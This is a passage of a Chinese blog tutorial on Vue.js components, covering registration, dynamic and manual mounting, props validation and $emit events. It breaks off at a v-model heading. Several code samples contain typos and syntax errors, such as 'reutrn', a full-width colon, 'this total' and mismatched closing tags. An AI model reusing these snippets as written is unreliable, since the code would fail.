    <content type="html"><![CDATA[<p>— 点点开发技能树  —<br>— Vue组件 及 通讯 —<br><a id="more"></a></p><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><p>　　<strong>组件</strong>可以把大的框架按照HTML拆分成小块功能实现，并实现内容复用。<br>　　同时组件之间还要传递数据或参数。当然组件也有很多缺点，最后介绍模块开发的单文件组件</p><h2 id="组件注册和使用"><a href="#组件注册和使用" class="headerlink" title="组件注册和使用"></a>组件注册和使用</h2><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--全局注册组件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//my-compenent 组件名</span></span></span><br><span class="line"><span class="javascript">Vue.component(<span class="string">'my-component'</span>,&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//选项</span></span></span><br><span class="line"><span class="xml">    template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--局部注册组件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Child = &#123;</span></span><br><span class="line"><span class="xml">    template : '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">    el: <span class="string">'app'</span>,</span></span><br><span class="line"><span class="undefined">    components: &#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//my-compenent 组件名</span></span></span><br><span class="line"><span class="javascript">        <span class="string">'my-component'</span>: Child</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意局部注册的组件在其子组件中不可用,如果需要使用，需要在子组件中声明</p></blockquote><p>　</p><blockquote><p>组件命名推荐：字母全小写且必须包含一个连字符。避免和当前以及未来的 HTML 元素相冲突。</p></blockquote><h3 id="使用-挂载组件"><a href="#使用-挂载组件" class="headerlink" title="使用-挂载组件"></a>使用-挂载组件</h3><p>　　一般直接标签使用即可。但在某些情况下会受到HTML限制，比如<code>&lt;table&gt;</code>内规定只允许是<code>&lt;tr&gt;</code>,<code>&lt;td&gt;</code>,<code>&lt;th&gt;</code>等元素，所以在<code>&lt;table&gt;</code>内使用组件是无效的。这时候可以使用<code>is属性</code>来挂载组件。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--普通使用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--is属性挂载组件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span> <span class="attr">is</span>=<span class="string">"my-component"</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="动态挂载组件"><a href="#动态挂载组件" class="headerlink" title="动态挂载组件"></a>动态挂载组件</h4><p>　　Vue 提供了一个特殊的元素<code>&lt;component&gt;</code>用来动态地挂载不同的组件，使用<code>is</code>特性来选择要挂载的组件。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 组件会在 `currentTabComponent` 改变时改变 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">v-bind:is</span>=<span class="string">"currentTabComponent"</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="手动挂载实例"><a href="#手动挂载实例" class="headerlink" title="手动挂载实例"></a>手动挂载实例</h4><p>　　Vue提供<code>Vue.extend</code>和<code>$mount()</code>两个方法来手动挂载一个实例。</p><ul><li><code>Vue.extend</code>是基础Vue构造器，创建一个“子类”，参数时一个包含组件选项的对象</li><li>如果Vue实例在实例化时没有收到<code>el</code>选项，他也处于“未挂载”状态</li><li><code>$mount</code>手动挂载一个未挂载的实例</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"mount-div"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//创建未挂载实例</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> MyComponent = Vue.extend(&#123;</span></span><br><span class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></span><br><span class="line"><span class="javascript">        data: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                name: <span class="string">'Aresn'</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="javascript">    <span class="comment">//挂载实例</span></span></span><br><span class="line"><span class="javascript">    newMyComponent().$mount(<span class="string">'#mount-div'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="模块化中使用组件"><a href="#模块化中使用组件" class="headerlink" title="模块化中使用组件"></a>模块化中使用组件</h3><p>　　在模块化中使用其他组件，需要在局部注册之前导入每个你想使用的组件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ComponentB.vue</span></span><br><span class="line"><span class="keyword">import</span> ComponentA <span class="keyword">from</span> <span class="string">'./ComponentA'</span></span><br><span class="line"><span class="keyword">import</span> ComponentC <span class="keyword">from</span> <span class="string">'./ComponentC'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    ComponentA,</span><br><span class="line">    ComponentC</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　现在<code>ComponentA</code>和<code>ComponentC</code>都可以在<code>ComponentB</code>的模板中使用了。</p><p>　　另外可以实现一些基础模块的全局化使用：<a href="https://cn.vuejs.org/v2/guide/components-registration.html#%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%85%A8%E5%B1%80%E6%B3%A8%E5%86%8C" target="_blank" rel="noopener">戳这里</a></p><h2 id="组件选项"><a href="#组件选项" class="headerlink" title="组件选项"></a>组件选项</h2><p>　　因为组件是可复用的 Vue 实例，所以它们与 new Vue 接收相同的选项，例如 <code>data</code>、<code>computed</code>、<code>watch</code>、<code>methods</code> 以及生命周期钩子等。仅有的例外是像 <code>el</code> 这样根实例特有的选项。</p><p>常用的有：</p><ul><li><code>template</code> 模板</li><li><code>data</code> 跟实例稍有区别，必须是函数，将数据<strong>return</strong>出去</li><li><code>computed</code> 计算属性</li><li><code>methods</code> 动作</li><li><code>components</code> 组建中嵌套组件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">'my-component'</span>,&#123;</span><br><span class="line">    <span class="comment">//选项</span></span><br><span class="line">    template: <span class="string">'&lt;div&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;'</span>,</span><br><span class="line">    data: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            message: <span class="string">'组件内容'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>　　组件中return的data如果引用了一个外部的变量，那么这个变量就不是自己独有的，而是所有相同组件共享的，牵一发而动全身。<br>　　如果想要各自独立，就需要组件通讯这个变量，再重新赋值。</p><h2 id="组件通讯"><a href="#组件通讯" class="headerlink" title="组件通讯"></a>组件通讯</h2><h3 id="父-gt-子-props"><a href="#父-gt-子-props" class="headerlink" title="父-&gt;子 props"></a>父-&gt;子 props</h3><p>　　通过<strong>props</strong>正向传输数据（父组件向子组件传递数据及参数）。父组件中的数据变化会传递给子组件，反过来不行。<br>　　在组件中，使用选项<strong>props</strong>来声明需要从父级接收的数据，值分为两种</p><ul><li><strong>数组</strong>：传递值</li><li><strong>对象</strong>：传递的值需要数据类型验证</li></ul><blockquote><p>额外的，每次父级组件发生更新时，子组件中所有的 prop 都将会刷新为最新的值。这意味着你不应该在一个子组件内部改变 prop。如果你这样做了，Vue 会在浏览器的控制台中发出警告。</p></blockquote><p>　　<code>props</code>中的数据类似于data，只是前者props来源于父级，后者是组件自己的数据，作用于是组件本身。<br>　　两者都可以在模板<code>template</code>、计算属性<code>computed</code>、<code>methods</code>中使用</p><h4 id="数组使用"><a href="#数组使用" class="headerlink" title="数组使用"></a>数组使用</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">my-component</span> <span class="attr">message</span>=<span class="string">"来自父组件的数据"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- &lt;my-component message2="来自父组件的数据2" message1="来自父组件的数据1"&gt;&lt;/my-component&gt;  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></span><br><span class="line"><span class="javascript">        props: [<span class="string">'message'</span>], <span class="comment">//['message1','message2']  多个数据</span></span></span><br><span class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>由于HTML特性不区分大小写，在<code>props中的warningText</code>在DOM中赋值时需要用<code>warning-text=&quot;提示信息&quot;</code>，即<code>&lt;my-component warning-text=&quot;提示信息&quot;&gt;&lt;/my-component&gt;</code></p></blockquote><h4 id="对象使用——数据验证"><a href="#对象使用——数据验证" class="headerlink" title="对象使用——数据验证"></a>对象使用——数据验证</h4><p>自带验证的数据类型有：</p><ul><li>String</li><li>Number</li><li>Boolean</li><li>Object</li><li>Array</li><li>Function</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">'my-component'</span>,&#123;</span><br><span class="line">        props: &#123;</span><br><span class="line">            <span class="comment">//必须是数字类型</span></span><br><span class="line">            propA: <span class="built_in">Number</span>,</span><br><span class="line">            <span class="comment">//必须是字符串或数字类型</span></span><br><span class="line">            propB: [<span class="built_in">String</span>,<span class="built_in">Number</span>],</span><br><span class="line">            <span class="comment">//布尔型，如果没有定义，默认为true</span></span><br><span class="line">            propC: &#123;</span><br><span class="line">                type: <span class="built_in">Boolean</span>,</span><br><span class="line">                <span class="keyword">default</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//数字，而且必须传入</span></span><br><span class="line">            propD: &#123;</span><br><span class="line">                type: <span class="built_in">Number</span>,</span><br><span class="line">                required: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//如果是数组或对象，默认值必须是一个函数来返回（没看懂）</span></span><br><span class="line">            propE: &#123;</span><br><span class="line">                type: <span class="built_in">Array</span>,</span><br><span class="line">                <span class="keyword">default</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> [];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//自定义了一个验证函数</span></span><br><span class="line">            propF: &#123;</span><br><span class="line">                validator: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>)</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> value &gt; <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, </span><br><span class="line">        template: <span class="string">'&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;'</span></span><br><span class="line">        data：<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            reutrn &#123;</span><br><span class="line">                count: <span class="keyword">this</span>.initCount</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>验证失败时，在开发版本下会在控制台抛出一条警告</p><h4 id="动态参数传入"><a href="#动态参数传入" class="headerlink" title="动态参数传入"></a>动态参数传入</h4><p>利用 <code>v-bind</code> 动态更新组件<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- :message 等于 v-bind:message --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">my-component</span> <span class="attr">:message</span>=<span class="string">"parentMessage"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></span><br><span class="line"><span class="javascript">        props: [<span class="string">'message'</span>], </span></span><br><span class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">        data: &#123;</span></span><br><span class="line"><span class="javascript">            parentMessage: <span class="string">''</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>直接传递数字、布尔值、数组、对象 需要使用<code>v-bind</code>，即<code>:message=&quot;[1,2,3]&quot;</code><br>不然<code>message=&quot;[1,2,3]&quot;</code>传递的是字符串 </p></blockquote><p>　　如果你想要将一个对象的所有属性都作为<code>prop</code>传入，你可以使用不带参数的 <code>v-bind</code>(取代<code>v-bind:prop-name</code>)。例如，对于一个给定的对象<code>post</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据</span></span><br><span class="line">post: &#123;</span><br><span class="line">  id: <span class="number">1</span>,</span><br><span class="line">  title: <span class="string">'My Journey with Vue'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//v-bind="对象"</span></span><br><span class="line">&lt;blog-post v-bind=<span class="string">"post"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span></span><br><span class="line"><span class="xml">//等价于</span></span><br><span class="line">&lt;blog-post</span><br><span class="line">  v-bind:id="post.id"</span><br><span class="line">  v-bind:title="post.title"</span><br><span class="line">&gt;&lt;/blog-post&gt;</span><br></pre></td></tr></table></figure></p><h4 id="应用-单向数据流"><a href="#应用-单向数据流" class="headerlink" title="应用-单向数据流"></a>应用-单向数据流</h4><blockquote><p>由于在JavaScript中对象和数组是引用类型，指向同一个内存空间，所以prop中的变量是对象和数组时，在子组件内改变是会影响父组件的</p></blockquote><p>使用场景：从父组件传递数据进来，保存原值，还可以可以随意操作<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component</span> <span class="attr">:init-count</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 变为短横分割命名 / v-bind传入数字--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></span><br><span class="line"><span class="javascript">        props: [<span class="string">'initCount'</span>], </span></span><br><span class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span><br><span class="line"><span class="javascript">        data：<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            reutrn &#123;</span></span><br><span class="line"><span class="javascript">                count: <span class="keyword">this</span>.initCount</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>还可以类似的使用<code>computed</code>转变传入值</p><h3 id="子-gt-父-emit-on"><a href="#子-gt-父-emit-on" class="headerlink" title="子-&gt;父 $emit $on"></a>子-&gt;父 $emit $on</h3><p>子组件需要向父组件传递数据时可以使用自定义事件——<code>$emit()</code>和<code>$on()</code></p><ul><li>子组件用<code>$emit()</code>来触发事件，父组件用<code>$on()</code>来监听子组件的事件</li><li>父组件也可以直接在子组件的自定义标签上使用<code>v-on</code>来监听子组件触发的自定义事件</li></ul><blockquote><p>跟组件和 prop 不同，事件名不存在任何自动化的大小写转换。而是触发的事件名需要完全匹配监听这个事件所用的名称。所以建议始终使用 kebab-case 的事件名。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 此处父组件接受，执行handleGetTotal函数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mycomponent</span></span></span><br><span class="line"><span class="tag">    @<span class="attr">increase</span>=<span class="string">"handleGetTotal"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">Vue.component(<span class="string">'my-component'</span>,&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        template: '\</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleIncrease"</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span>\</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        data：<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            reutrn &#123;</span></span><br><span class="line"><span class="undefined">                counter: 0</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        methods: &#123;</span></span><br><span class="line"><span class="javascript">            handleIncrease: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.counter++;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 此处子组件向父组件发送发送increase信号，和参数</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.$emit(<span class="string">'increase'</span>,<span class="keyword">this</span>.counter);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> app =<span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">    data: &#123;</span></span><br><span class="line"><span class="undefined">        total: 0</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    methods: &#123;</span></span><br><span class="line"><span class="javascript">        handleGetTotal: <span class="function"><span class="keyword">function</span> (<span class="params">total</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span> total = total;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>　　以上的 父函数 处理方式是一个方法。如果是在语句中处理，子函数抛出的参数被放在<code>$event</code>变量中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 增加字体大小 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blog-post</span></span></span><br><span class="line"><span class="tag">  <span class="attr">...</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:enlarge-text</span>=<span class="string">"postFontSize += $event"</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>$emit</code>使用方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$emit(自定义事件名称，抛出参数)</span><br></pre></td></tr></table></figure></p><h4 id="组件使用-v-model"><a href="#组件使用-v-model" class="headerlink" title="组件使用 v-model"></a>组件使用 